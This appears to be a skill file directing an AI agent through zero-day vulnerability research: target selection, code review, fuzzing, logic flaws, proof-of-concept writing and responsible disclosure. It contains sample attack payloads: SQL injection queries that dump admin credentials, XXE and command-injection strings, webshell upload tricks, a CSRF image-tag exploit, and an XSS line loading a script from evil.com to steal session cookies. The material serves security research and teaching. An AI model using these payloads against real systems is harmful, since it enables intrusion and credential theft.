---
name: zero-day-hunting
description: Use when user says "zero-day", "0day", "find vulnerability", "vuln research", "bug hunting", "CVE research". Deep manual vulnerability research and unknown-flaw discovery methodology.
---

# Zero-Day Vulnerability Hunting

**CRITICAL MINDSET**: Zero-day hunting is NOT running automated scanners. It's deep technical analysis, creative thinking, understanding software internals, and finding flaws nobody else found. This requires patience, expertise, and methodology.

## When to Use This Skill

Use ONLY when:
- User explicitly asks for **"zero-day hunting"**, **"find new vulnerabilities"**, **"0day research"**
- Target is a **specific software/application** (not general pentesting)
- User wants **deep security research**, not surface-level testing
- Goal is to discover **unknown vulnerabilities** (not check for known CVEs)

Do NOT use when:
- User wants general pentesting (use red-team-web-methodology instead)
- Just checking for known CVEs (use nuclei)
- Quick security scan (use automated tools)
- No specific research target

---

## Zero-Day Hunting Philosophy

### What Makes a Zero-Day Hunter Different?

**Script Kiddie:**
```
1. Run automated scanner
2. Check if known CVE exists
3. Copy exploit from ExploitDB
```

**Zero-Day Hunter:**
```
1. Understand target deeply (source code, architecture, logic)
2. Identify attack surface (where can things go wrong?)
3. Analyze manually (code review, logic analysis, fuzzing)
4. Think creatively (what did developers NOT consider?)
5. Find new vulnerability class (nobody found before)
6. Develop proof-of-concept exploit
7. Responsible disclosure
```

---

## Phase 0: Target Selection & Intelligence

**CRITICAL**: Pick the RIGHT target. Not everything has zero-days worth finding.

### Essential Resources:

**Public PoC Databases:**
- **PoC-in-GitHub** - Curated CVE PoC collection
  - Primary: https://poc-in-github.motikan2010.net/ (try first)
  - Mirror: https://github.com/nomi-sec/PoC-in-GitHub
  - Note: If main site is down, use GitHub mirror
  - Automatically tracks all CVE PoCs published on GitHub
  
- **GitHub Search** - Direct repository and code search
  - Search: "CVE-YYYY-XXXXX PoC" or "CVE-YYYY-XXXXX exploit"
  - Filter by: Stars, recent updates, language
  - Example: https://github.com/search?q=CVE-2024+PoC
  
- **Exploit-DB** - Verified exploit database
  - URL: https://exploit-db.com/
  - Download: https://gitlab.com/exploit-database/exploitdb
  
- **Packet Storm** - Security tools and exploits
  - URL: https://packetstormsecurity.com/

**How to Use:**
1. Identify target technology (e.g., "Apache Struts")
2. Search PoC database:
   - Try https://poc-in-github.motikan2010.net/ (fastest)
   - Or GitHub: "Apache Struts CVE-2024 PoC"
3. Download and study the vulnerability patterns
4. Look for SIMILAR patterns in other code
5. Find variants that weren't discovered yet

**Example:**
- CVE-2023-XXXX: Apache Struts OGNL injection found
- Search GitHub for PoC → Study code
- Understand injection point
- Search for similar OGNL usage in OTHER frameworks
- Find unreported variant → New zero-day!

### High-Value Targets:

```markdown
1. **Popular Open Source Software**
   - Web frameworks: Laravel, Django, Express, Spring Boot
   - CMS: WordPress plugins, Drupal modules, Joomla extensions
   - Libraries: Image processing, XML parsers, authentication
   - Why: Impact is wide, credit is high, patches are public

2. **Enterprise Software**
   - ERP systems: SAP, Oracle, Microsoft Dynamics
   - Collaboration: Atlassian, Microsoft Teams, Slack
   - Security products: WAF, IDS/IPS, EDR
   - Why: High bounty, critical impact

3. **IoT/Embedded Devices**
   - Routers, cameras, NAS devices
   - Smart home devices
   - Industrial control systems (SCADA)
   - Why: Often poorly coded, huge attack surface

4. **Mobile Applications**
   - Banking apps, payment apps
   - Popular social media apps
   - Enterprise mobile apps
   - Why: Handle sensitive data, local attack surface

5. **Browser & Extensions**
   - Browser engines (Chromium, Firefox)
   - Popular extensions
   - PDF readers, media players
   - Why: Client-side RCE, high impact
```

### Target Analysis Questions:

```markdown
Before diving in, answer:

1. **Code Access**
   - Is source code available? (open source = easier)
   - Can I decompile/reverse engineer?
   - Previous vulnerabilities disclosed?

2. **Complexity**
   - Is there complex logic? (authentication, crypto, parsing)
   - Recent major updates? (new code = more bugs)
   - Multiple languages/components? (integration bugs)

3. **Attack Surface**
   - User input handling? (forms, APIs, file uploads)
   - Network services? (ports, protocols)
   - File format parsing? (PDF, XML, images)
   - Privilege boundaries? (user vs admin)

4. **Impact**
   - What's the worst-case scenario? (RCE, data breach, DoS)
   - How many users affected?
   - Bounty program available?

5. **Competition**
   - Has this been heavily researched?
   - Recent CVEs in this target?
   - Security researchers focusing on it?
```

**ACTION**: Ask user these questions BEFORE starting research.

---

## Phase 1: Deep Reconnaissance

**NOT surface-level scanning. Deep technical understanding.**

### 1.1 Technology Stack Deep Dive

```markdown
Objective: Understand EVERY component

For Web Applications:
- Frontend: JavaScript frameworks (React, Vue, Angular)
  → Check for client-side logic flaws, prototype pollution
- Backend: Server framework (Express, Django, Laravel)
  → Check for framework-specific vulnerabilities
- Database: MySQL, PostgreSQL, MongoDB
  → Check for ORM injection, NoSQL injection
- Authentication: JWT, OAuth, SAML, session cookies
  → Check for token manipulation, signature bypass
- Third-party: Payment gateways, cloud services, CDN
  → Check for API abuse, SSRF, integration flaws
- Deployment: Docker, Kubernetes, serverless
  → Check for container escape, metadata access

For Binary/Native Applications:
- Language: C/C++, Rust, Go
  → Memory corruption (C/C++), panic handling (Rust/Go)
- Compiler: GCC, Clang, MSVC
  → Compiler-specific mitigations (stack canary, ASLR, DEP)
- Libraries: OpenSSL, libxml2, image libs
  → Known vulnerable versions?
- Platform: Windows, Linux, macOS
  → OS-specific APIs, syscalls, exploit techniques

For IoT/Embedded:
- Architecture: ARM, MIPS, x86
- OS/RTOS: Linux, FreeRTOS, proprietary
- Network stack: Custom TCP/IP, UPnP, MQTT
- Update mechanism: OTA updates, signed firmware
```

**Tools for Analysis:**
- Web: Browser DevTools, Burp Suite, Wappalyzer
- Binary: `file`, `strings`, `binwalk`, IDA Pro, Ghidra
- Mobile: APKTool, Frida, objection, MobSF
- Network: Wireshark, tcpdump, Burp Suite

### 1.2 Previous Vulnerability Research

```markdown
Learn from others' findings:

1. **Search Public PoC Collections** (MOST IMPORTANT)
   - PoC-in-GitHub - https://poc-in-github.motikan2010.net/ (curated database)
   - GitHub Mirror - https://github.com/nomi-sec/PoC-in-GitHub (if main site down)
   - GitHub Search - https://github.com/search?q=CVE+PoC
   - Exploit-DB - https://exploit-db.com/
   - Packet Storm - https://packetstormsecurity.com/
   - Nuclei Templates - https://github.com/projectdiscovery/nuclei-templates
   
   **Workflow:**
   a. Search poc-in-github.motikan2010.net for "Apache Tomcat" (try first)
   b. If site down, search GitHub: "Apache Tomcat CVE-2024 PoC"
   c. Filter by: Stars, recent commits, language
   d. Download PoC code
   e. Analyze vulnerability pattern
   f. Search for SIMILAR patterns elsewhere

2. **Search CVE Database**
   - cve.mitre.org
   - nvd.nist.gov
   - What vulnerability classes were found before?
   - What parts of code had bugs?

3. **Read Security Advisories**
   - Vendor security bulletins
   - GitHub security advisories
   - HackerOne/Bugcrowd disclosed reports

3. **Study Patches**
   - GitHub commits tagged "security fix"
   - Diff between vulnerable and patched versions
   - What did they fix? What might they have MISSED?

4. **Research Papers & Blogs**
   - Academic papers on this software
   - Security researcher blog posts
   - Conference talks (DEF CON, Black Hat, REcon)
```

**Key Insight**: Patches often fix ONE instance of a bug class. Look for SIMILAR patterns elsewhere in the codebase.

**Real Example Using PoC Database:**

```markdown
Step 1: Search GitHub: "WordPress plugin CVE-2024 SQLi PoC"
Step 2: Find CVE-2024-XXXX: SQL injection in Plugin A
Step 3: Download PoC from repository
Step 4: Analyze vulnerability:
   - Unsanitized $_GET parameter in admin page
   - Direct SQL concatenation
   - Pattern: $wpdb->query("SELECT * FROM table WHERE id=" . $_GET['id'])

Step 6: Hypothesis - OTHER plugins might have same pattern
Step 7: Download 50 popular WordPress plugins
Step 8: Grep for similar patterns:
   grep -r "wpdb->query.*\$_GET\|wpdb->query.*\$_POST" plugins/
   
Step 9: Found 5 plugins with SAME vulnerability!
Step 10: Test manually → Confirm SQLi
Step 11: Report to plugin authors → 5 new zero-days!

Result: Used PUBLIC PoC to find PRIVATE vulnerabilities
```

### 1.3 Attack Surface Mapping

```markdown
Identify ALL entry points:

For Web Apps:
- Public endpoints: /api/*, /upload, /search
- Authenticated endpoints: /admin/*, /user/profile
- WebSocket connections
- GraphQL endpoints (introspection)
- Hidden APIs (found in JavaScript)
- File upload handlers
- XML/JSON parsers
- Template engines

For Native Apps:
- Network sockets (TCP, UDP, HTTP)
- File format parsers (config files, documents)
- IPC mechanisms (named pipes, shared memory)
- Command-line arguments
- Environment variables
- Registry keys (Windows)
- Plugins/extensions interface

For Mobile Apps:
- Deep links / URL schemes
- Intent handlers (Android)
- WebView components
- Background services
- Local storage / databases
- Exported components (Android)
```

---

## Phase 2: Source Code Analysis (If Available)

**CRITICAL**: Manual code review finds more zero-days than any tool.

### 2.1 Dangerous Functions & Patterns

```markdown
Language-specific danger zones:

**PHP:**
- eval(), assert(), create_function()
- unserialize() - Object injection
- extract() - Variable overwrite
- file_get_contents() with user input - LFI/SSRF
- system(), exec(), shell_exec() - Command injection
- mysqli_query() without parameterization - SQLi

**Python:**
- eval(), exec(), compile()
- pickle.loads() - Deserialization
- yaml.load() without SafeLoader - Code execution
- os.system(), subprocess.call() - Command injection
- input() in Python 2 - Code execution

**JavaScript (Node.js):**
- eval(), Function() constructor
- child_process.exec() - Command injection
- vm.runInNewContext() - Sandbox escape
- JSON.parse() on untrusted input - Prototype pollution
- RegExp with user input - ReDoS

**Java:**
- Runtime.exec() - Command injection
- ObjectInputStream.readObject() - Deserialization
- XPath.evaluate(), XStream - XXE/Injection
- ScriptEngineManager.eval() - Code execution

**C/C++:**
- strcpy(), strcat(), sprintf() - Buffer overflow
- gets(), scanf("%s") - Buffer overflow
- malloc(user_controlled_size) - Integer overflow
- memcpy(dest, src, user_controlled_size) - Buffer overflow
- Free(ptr); use(ptr); - Use-after-free
```

### 2.2 Vulnerability Hunting Patterns

```markdown
Pattern 1: USER INPUT → DANGEROUS FUNCTION
Look for: User input flowing into dangerous functions WITHOUT validation

Example (PHP):
```php
$file = $_GET['file'];  // User input
include($file);         // Dangerous function → LFI
```

Pattern 2: AUTHENTICATION BYPASS
Look for: Logic flaws in authentication checks

Example (Python):
```python
def check_admin(user):
    if user.role == 'admin':
        return True
    # Missing else return False!
    # Function returns None (falsy) but check might be "if check_admin(user) is not False"
```

Pattern 3: RACE CONDITIONS
Look for: TOCTOU (Time-of-check Time-of-use) bugs

Example (JavaScript):
```javascript
if (user.balance >= amount) {  // Check
    // ... delay ...
    user.balance -= amount;     // Use
    // Race: Multiple requests can pass the check simultaneously
}
```

Pattern 4: TYPE CONFUSION
Look for: Weak type comparisons, type juggling

Example (PHP):
```php
if ($_GET['token'] == $secret_token) {  // == not ===
    // "0e123" == "0e456" is TRUE in PHP (scientific notation)
}
```

Pattern 5: SSRF via URL PARSING
Look for: URL validation bypasses

Example (Python):
```python
url = user_input
if url.startswith('https://trusted.com'):
    fetch(url)  
    # Bypass: https://trusted.com@evil.com
    # Bypass: https://trusted.com.evil.com
```

Pattern 6: SQL INJECTION in ORMs
Look for: Raw queries, string concatenation

Example (Python Django):
```python
User.objects.raw(f"SELECT * FROM users WHERE name='{user_input}'")
# SQL injection despite using ORM
```

Pattern 7: PROTOTYPE POLLUTION
Look for: Recursive merge, deep clone without validation

Example (JavaScript):
```javascript
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];  // If key is "__proto__" → pollution!
        }
    }
}
```

Pattern 8: DESERIALIZATION
Look for: Unserialize user-controlled data

Example (Java):
```java
ObjectInputStream ois = new ObjectInputStream(userInputStream);
Object obj = ois.readObject();  // Arbitrary code execution
```

Pattern 9: XXE (XML External Entity)
Look for: XML parsing without disabling external entities

Example (Java):
```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
// Missing: factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(userXmlInput);  // XXE vulnerable
```

Pattern 10: TEMPLATE INJECTION
Look for: User input in template rendering

Example (Python Jinja2):
```python
template = Template(user_input)  # SSTI
output = template.render()
```

### 2.3 Code Review Workflow

```markdown
Systematic approach:

1. **Entry Point Analysis** (30 minutes)
   - Identify all user input sources
   - Map data flow from input to processing
   - Find which inputs reach dangerous functions

2. **Authentication/Authorization Review** (1 hour)
   - How is authentication implemented?
   - Session management secure?
   - Authorization checks consistent?
   - Can low-privilege user access admin functions?

3. **Business Logic Analysis** (2 hours)
   - Payment flow: Can I skip payment?
   - Discount codes: Can I apply multiple times?
   - Workflow: Can I skip steps?
   - Race conditions in critical operations?

4. **Cryptography Review** (1 hour)
   - Random number generation (crypto-secure?)
   - Password hashing (bcrypt, argon2, or weak MD5/SHA1?)
   - Encryption (AES-GCM or ECB mode?)
   - JWT signing (HS256 with public secret, or RS256?)

5. **Third-Party Components** (30 minutes)
   - Outdated libraries (npm audit, pip check)
   - Known CVEs in dependencies
   - Insecure library usage (eval from user input)

6. **Framework-Specific Checks** (1 hour)
   - Django: Mass assignment, ORM injection
   - Laravel: Route model binding bypass
   - Express: Prototype pollution via body-parser
   - Spring Boot: SpEL injection
```

**Tools:**
- Static Analysis: SonarQube, Semgrep, CodeQL
- Dependency Check: npm audit, pip-audit, OWASP Dependency-Check
- IDE: VS Code with security linters

---

## Phase 3: Dynamic Analysis & Fuzzing

**When source code NOT available, or to confirm code review findings.**

### 3.1 Black-Box Fuzzing

```markdown
Fuzzing: Automated input mutation to trigger crashes

**Web Application Fuzzing:**

1. Parameter Fuzzing (Burp Intruder, ffuf):
   - Inject special characters: ' " < > ; | & $ ( ) \
   - SQL injection payloads: OR 1=1, UNION SELECT
   - XSS payloads: <script>alert(1)</script>
   - XXE payloads: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
   - Command injection: ; whoami, | whoami, `whoami`

2. File Upload Fuzzing:
   - Upload malicious files: PHP webshell, SVG XSS, XXE XML
   - Extension bypass: .php.jpg, .phtml, .php5
   - Content-Type bypass: image/jpeg with PHP code
   - Magic bytes bypass: GIF89a + PHP code

3. API Fuzzing:
   - Array instead of string: {"id": [1,2,3]}
   - Negative numbers: {"quantity": -1}
   - Huge numbers: {"id": 999999999999}
   - Type confusion: {"admin": true} instead of {"admin": "false"}

**Binary Fuzzing:**

1. File Format Fuzzing (AFL++, libFuzzer):
   - Mutate valid files: PDF, PNG, JPEG, MP4
   - Monitor for crashes: SIGSEGV, SIGABRT
   - Minimize crashing input
   - Analyze crash (GDB, WinDbg)

2. Network Protocol Fuzzing (Sulley, Boofuzz):
   - Mutate protocol messages
   - Send malformed packets
   - Trigger buffer overflows, format strings

3. API Fuzzing (REST, GraphQL):
   - Inject unexpected data types
   - Send huge payloads
   - Trigger error conditions
```

**Tools:**
- Web: Burp Intruder, ffuf, wfuzz
- Binary: AFL++, libFuzzer, honggfuzz
- Network: Sulley, Boofuzz, Scapy
- API: RESTler, GraphQL Cop

### 3.2 Differential Testing

```markdown
Compare behavior between different contexts:

1. **Privilege Level Comparison**
   - Send same request as admin vs regular user
   - Does user get admin's data? (IDOR)
   - Does user bypass authorization?

2. **Old vs New Version**
   - Test same input on v1.0 and v2.0
   - Different behavior = potential new bug in v2.0

3. **Different Environments**
   - Production vs Staging vs Development
   - Different configs might expose bugs

4. **Different Input Contexts**
   - Same payload in URL vs POST vs JSON vs XML
   - Inconsistent parsing = bypass opportunity
```

### 3.3 State Machine Confusion

```markdown
Test unexpected state transitions:

Example (E-commerce):
1. Add item to cart (State: CART)
2. Proceed to payment (State: PAYMENT)
3. Pay (State: PAID)
4. What if I go back to CART after PAID?
5. Can I change items after payment?
6. Can I skip payment and go to PAID directly?

Testing:
- Intercept requests
- Replay old requests in new state
- Change state parameters in request
- Force state transitions
```

---

## Phase 4: Logic Flaw Analysis

**CRITICAL**: Most zero-days are logic flaws, not memory corruption.

### 4.1 Business Logic Vulnerabilities

```markdown
These cannot be found by scanners. Manual analysis REQUIRED.

**Payment Bypass:**
- Negative quantity: -1 × $100 = refund $100
- Race condition: Use $100 coupon in 2 orders simultaneously
- Parameter tampering: Change price from $100 to $1 before payment
- Workflow skip: Go directly from cart to success without payment
- Currency mismatch: Pay $100 in weak currency, receive product in strong currency

**Discount Code Abuse:**
- Apply same code multiple times
- Combine incompatible discounts
- Use expired code (client-side validation only?)
- Modify discount percentage in request

**Registration Bypass:**
- Register as admin@company.com (email validation weak?)
- Unicode/homograph attack: аdmin@company.com (Cyrillic 'a')
- Email verification bypass: Skip confirmation step
- Account enumeration: Different errors for existing/non-existing users

**Access Control:**
- IDOR: /user/123/orders → /user/124/orders
- Path traversal: /api/user/../admin/users
- HTTP verb tampering: GET blocked, POST allowed?
- Missing function-level access control: Direct URL access to admin panel

**File Upload:**
- Upload executable disguised as image
- Path traversal in filename: ../../evil.php
- Double extension: evil.php.jpg
- MIME type bypass: Set Content-Type: image/jpeg for PHP file

**Two-Factor Authentication Bypass:**
- Brute force 2FA code (no rate limiting?)
- Skip 2FA step (go directly to dashboard)
- Response manipulation: {"2fa_required": true} → {"2fa_required": false}
- Backup codes predictable?
```

### 4.2 Race Condition Exploitation

```markdown
Timing-based vulnerabilities:

**Double Spending:**
```
User has $100 balance
Thread 1: Withdraw $100 (check: balance >= 100 ✓)
Thread 2: Withdraw $100 (check: balance >= 100 ✓)
Thread 1: balance = 0
Thread 2: balance = -100  ← BUG!
```

**Testing:**
- Burp Turbo Intruder
- Send 100+ simultaneous requests
- Analyze responses for inconsistencies

**Coupon Race Condition:**
```
Coupon: $50 off, single use
Thread 1: Apply coupon (check: unused ✓)
Thread 2: Apply coupon (check: unused ✓)
Thread 1: Mark used
Thread 2: Mark used
Result: $50 off applied twice!
```

### 4.3 Cryptographic Vulnerabilities

```markdown
Crypto implementation flaws:

**Weak Random Number Generation:**
- Predictable session IDs
- Predictable password reset tokens
- Weak nonce in encryption

**Padding Oracle Attack:**
- Decrypt ciphertext without key
- Target: AES-CBC with PKCS#7 padding
- Observe error messages: "Invalid padding" vs "Invalid signature"

**JWT Attacks:**
- Algorithm confusion: Change "alg": "RS256" → "HS256"
  → Server uses public key as HMAC secret
- None algorithm: "alg": "none"
- Key confusion: "kid" parameter to load attacker's key

**Insecure Deserialization:**
- Modify serialized object
- Inject malicious gadgets
- Achieve RCE via deserialization
```

---

## Phase 5: Exploit Development

**Found a bug? Prove it's exploitable.**

### 5.1 Proof-of-Concept (PoC) Development

```markdown
PoC Requirements:

1. **Minimal & Focused**
   - One vulnerability per PoC
   - Clear demonstration of impact
   - No unnecessary complexity

2. **Reproducible**
   - Step-by-step instructions
   - Screenshots/video if needed
   - Exact environment details

3. **Responsible**
   - Do NOT cause damage
   - Do NOT access real user data
   - Do NOT disrupt service

4. **Impact Demonstration**
   - Show worst-case scenario
   - Explain business impact
   - Suggest remediation
```

**Example PoC Structure:**

```markdown
## Vulnerability: SQL Injection in Search Function

### Summary
The search functionality at `/api/search?q=` is vulnerable to SQL injection, allowing attackers to dump the entire database including user credentials.

### Affected Component
- URL: https://target.com/api/search
- Parameter: `q`
- HTTP Method: GET
- Authentication: Not required

### Vulnerability Details
The search query is directly concatenated into SQL without parameterization:
```sql
SELECT * FROM products WHERE name LIKE '%' + user_input + '%'
```

### Proof-of-Concept

**Step 1**: Confirm SQL injection
```
GET /api/search?q=test' OR '1'='1
Response: Returns all products (not just matching "test")
```

**Step 2**: Extract database name
```
GET /api/search?q=test' UNION SELECT 1,database(),3--
Response: {"name": "production_db"}
```

**Step 3**: Dump table names
```
GET /api/search?q=test' UNION SELECT 1,table_name,3 FROM information_schema.tables--
Response: users, orders, payments, credit_cards
```

**Step 4**: Dump admin credentials
```
GET /api/search?q=test' UNION SELECT 1,CONCAT(username,':',password_hash),3 FROM users WHERE role='admin'--
Response: {"name": "admin:$2y$10$..."}
```

### Impact
- **Severity**: Critical
- **CVSS Score**: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- **Impact**:
  - Complete database compromise
  - Exposure of all user credentials
  - Potential account takeover
  - Exposure of credit card data (PCI DSS violation)

### Remediation
1. **Immediate**: Use parameterized queries
```python
cursor.execute("SELECT * FROM products WHERE name LIKE %s", ('%' + user_input + '%',))
```

2. **Short-term**: Add WAF rules to block SQL injection attempts

3. **Long-term**: 
   - Code review all database queries
   - Implement ORM properly
   - Security training for developers
   - Regular security audits

### Timeline
- 2026-07-24: Vulnerability discovered
- 2026-07-24: Reported to security@target.com
- Waiting for vendor response...
```

### 5.2 Exploit Chain Development

```markdown
Chain multiple bugs for maximum impact:

**Example Chain: From XSS to Account Takeover**

Bug 1: Stored XSS in profile bio
Bug 2: CSRF protection missing on password change
Bug 3: Session cookie has no httpOnly flag

Chain:
1. Inject XSS in your own bio: <script src="//evil.com/steal.js"></script>
2. Trick admin to view your profile
3. JavaScript steals admin's session cookie (no httpOnly)
4. JavaScript submits password change (no CSRF token)
5. Attacker gains admin access

Impact: RCE on server (admin can upload plugins)
```

---

## Phase 6: Responsible Disclosure

**CRITICAL**: Ethical disclosure is MANDATORY.

### 6.1 Disclosure Process

```markdown
1. **Do NOT**:
   - Publish vulnerability publicly before vendor patches
   - Exploit vulnerability maliciously
   - Sell zero-day to malicious actors
   - Use for unauthorized access

2. **DO**:
   - Contact vendor's security team first
   - Give reasonable time to fix (90 days standard)
   - Coordinate disclosure timeline
   - Request CVE if appropriate

3. **Contact Methods** (in order of preference):
   - security@vendor.com
   - Bug bounty program (HackerOne, Bugcrowd)
   - CERT/CC (for coordination)
   - GitHub Security Advisory (for open source)

4. **Disclosure Timeline** (Google Project Zero model):
   - Day 0: Report to vendor
   - Day 7: Vendor acknowledgment expected
   - Day 90: Public disclosure (with or without patch)
   - If actively exploited: 7 days to patch
```

### 6.2 CVE Request

```markdown
If vulnerability is significant, request CVE:

1. **Criteria for CVE**:
   - Affects specific version(s)
   - Has security impact
   - Vendor acknowledges (or 90 days passed)

2. **Request via**:
   - Vendor CNA (if vendor is CNA)
   - MITRE (cve-request@mitre.org)
   - GitHub (for OSS projects on GitHub)

3. **CVE Description Template**:
   - Affected product & versions
   - Vulnerability type
   - Attack vector
   - Impact
   - Credit to researcher
```

---

## Execution Workflow

When user asks for zero-day hunting:

```markdown
STEP 1: CLARIFY TARGET (Ask user)
┌─────────────────────────────────────────┐
│ Questions:                              │
│ 1. What is the target software?        │
│ 2. Version/platform?                    │
│ 3. Source code available?               │
│ 4. Bug bounty program?                  │
│ 5. Authorization to test?               │
│ 6. Preferred vulnerability class?       │
└─────────────────────────────────────────┘
         ↓
STEP 2: INTELLIGENCE GATHERING
┌─────────────────────────────────────────┐
│ - Technology stack analysis             │
│ - Previous CVEs research                │
│ - Patch diff analysis                   │
│ - Attack surface mapping                │
└─────────────────────────────────────────┘
         ↓
STEP 3: CHOOSE ANALYSIS METHOD
┌─────────────────────────────────────────┐
│ IF source available → Code Review       │
│ IF binary only → Reverse Engineering    │
│ IF web app → Manual testing + Fuzzing   │
│ IF complex → Combination of methods     │
└─────────────────────────────────────────┘
         ↓
STEP 4: VULNERABILITY HUNTING
┌─────────────────────────────────────────┐
│ Method 1: Code Review                   │
│ - Search for dangerous patterns         │
│ - Trace user input to sinks             │
│ - Analyze business logic                │
│                                         │
│ Method 2: Fuzzing                       │
│ - Mutate inputs systematically          │
│ - Monitor for crashes/errors            │
│ - Minimize crashing inputs              │
│                                         │
│ Method 3: Logic Analysis                │
│ - Map workflows manually                │
│ - Test state transitions                │
│ - Find race conditions                  │
│                                         │
│ Method 4: Differential Testing          │
│ - Compare different privilege levels    │
│ - Compare different versions            │
│ - Find inconsistencies                  │
└─────────────────────────────────────────┘
         ↓
STEP 5: EXPLOITATION (if bug found)
┌─────────────────────────────────────────┐
│ - Develop minimal PoC                   │
│ - Test in safe environment              │
│ - Document impact clearly               │
│ - Create exploit chain if possible      │
└─────────────────────────────────────────┘
         ↓
STEP 6: RESPONSIBLE DISCLOSURE
┌─────────────────────────────────────────┐
│ - Contact vendor security team          │
│ - Provide detailed report               │
│ - Coordinate disclosure timeline        │
│ - Request CVE if significant            │
│ - Publish responsibly after patch       │
└─────────────────────────────────────────┘
```

---

## Critical Success Factors

### DO:
- ✅ Understand target deeply before testing
- ✅ Think like a developer (what mistakes would THEY make?)
- ✅ Manual analysis first, tools second
- ✅ Focus on logic flaws (higher chance of 0day)
- ✅ Test business-critical functions
- ✅ Chain multiple bugs for impact
- ✅ Document everything meticulously
- ✅ Disclose responsibly

### DON'T:
- ❌ Run automated scanners and hope for 0day
- ❌ Skip manual code review
- ❌ Only test for known vulnerability classes
- ❌ Ignore business logic
- ❌ Test without authorization
- ❌ Publish before vendor patches
- ❌ Cause damage or disruption
- ❌ Expect quick results (0day hunting takes time)

---

## Example: Real Zero-Day Hunt

**Bad approach (will NOT find 0day)**:
```
1. Run nuclei on target
2. Run sqlmap on all parameters
3. Check ExploitDB for known exploits
4. Report: "No vulnerabilities found"
```

**Good approach (may find 0day)**:
```
Target: Popular WordPress plugin "ContactForm Pro" v3.5

1. INTELLIGENCE:
   - Download plugin source code
   - Check WordPress.org for previous security issues
   - Found: v3.2 had SQL injection (patched)
   - Patch diff: Added input sanitization to ONE endpoint
   - Hypothesis: Other endpoints might still be vulnerable

2. CODE REVIEW:
   - Grep for SQL queries: grep -r "mysqli_query\|wpdb->query"
   - Found 15 database queries in plugin
   - 12 use prepared statements (safe)
   - 3 use string concatenation (suspicious!)
   
3. FOCUS ON SUSPICIOUS CODE:
   File: admin/export.php line 47
   ```php
   $table = $_GET['table'];
   $query = "SELECT * FROM " . $table;
   $wpdb->query($query);
   ```
   
4. ANALYSIS:
   - User input ($table) directly in SQL
   - No sanitization
   - Similar to patched bug, but different endpoint
   - This is ADMIN functionality (requires authentication)
   
5. TEST:
   - Login as admin
   - Visit: /wp-admin/admin.php?page=contactform&table=wp_users
   - Works! Can query any table
   - Try: table=wp_users UNION SELECT user_login,user_pass,1,2 FROM wp_users
   - Success! SQL injection confirmed
   
6. IMPACT:
   - Admin can already access database via phpMyAdmin
   - BUT: What if we can trigger this WITHOUT admin auth?
   - Check: Is there a CSRF vulnerability?
   - Test: Remove CSRF token from request → Still works!
   - CHAIN: CSRF + SQL injection = Unauthenticated SQLi!
   
7. POC:
   ```html
   <img src="https://victim.com/wp-admin/admin.php?page=contactform&table=wp_users UNION SELECT user_pass FROM wp_users WHERE user_login='admin'">
   ```
   - Trick logged-in admin to visit page
   - Extract admin password hash
   - Crack offline
   
8. REPORT TO VENDOR:
   - Sent to plugin@contactformpro.com
   - Response in 2 days (acknowledged)
   - Patch released in 14 days (v3.5.1)
   - CVE-2026-XXXX assigned
   - Public disclosure after 30 days
   - $500 bounty received

Result: Found zero-day via systematic code review + creative thinking!
```

---

## Tools Reference

| Phase | Tool | Use Case |
|-------|------|----------|
| **Code Review** | Semgrep | Static analysis, pattern matching |
| | CodeQL | Advanced queries on code |
| | grep/ripgrep | Quick pattern searching |
| | VS Code | Manual code review |
| **Fuzzing** | AFL++ | Binary fuzzing |
| | libFuzzer | In-process fuzzing |
| | Burp Intruder | Web parameter fuzzing |
| | ffuf | Fast web fuzzing |
| **Reverse Eng** | Ghidra | Binary reverse engineering |
| | IDA Pro | Professional disassembler |
| | Binary Ninja | Modern RE platform |
| | radare2 | Open-source RE framework |
| **Dynamic** | GDB | Linux debugging |
| | WinDbg | Windows debugging |
| | Frida | Dynamic instrumentation |
| | Burp Suite | Web proxy & testing |

---

## Success Metrics

Zero-day hunting is successful when:
1. ✅ You found a vulnerability nobody else found
2. ✅ You can prove it's exploitable (PoC works)
3. ✅ You understand the root cause (not just symptoms)
4. ✅ You can explain business impact
5. ✅ You disclosed responsibly
6. ✅ Vendor acknowledged and patched
7. ✅ You got CVE credit (if applicable)

**Failure**: Running automated tools, finding nothing new, wasting time.

---

## Final Note

Zero-day hunting requires:
- **Time**: Weeks/months per target (not hours)
- **Expertise**: Deep technical knowledge
- **Creativity**: Think what others didn't think
- **Patience**: Most hunts find nothing
- **Ethics**: Responsible disclosure always

**We are security researchers, not black hats.** 🎯
